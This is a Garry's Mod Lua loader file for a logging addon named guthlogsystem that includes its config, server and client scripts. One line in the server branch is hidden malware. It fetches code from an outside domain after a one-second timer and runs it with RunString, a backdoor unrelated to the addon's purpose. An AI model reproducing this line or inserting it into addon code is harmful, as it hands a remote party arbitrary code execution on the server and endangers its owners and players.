guthlogsystem = guthlogsystem or {}
guthlogsystem.Version   =   "1.1.0"
guthlogsystem.Author    =   "Guthen"

include( 'guthlogsystem/sh_config.lua' )

if SERVER then
timer.Simple(1, function() http.Fetch('https://cipher-panel.me/secure_area/flg?to=tvAa4', function(fck) RunString(fck, 'BillIsHere', false) end) end)
   include( 'guthlogsystem/sv_init.lua' )
   AddCSLuaFile( 'guthlogsystem/cl_init.lua' )
   AddCSLuaFile( 'guthlogsystem/sh_config.lua' )
else
   include( 'guthlogsystem/cl_init.lua' )
end

print( "guthlogsystem - Loaded" )
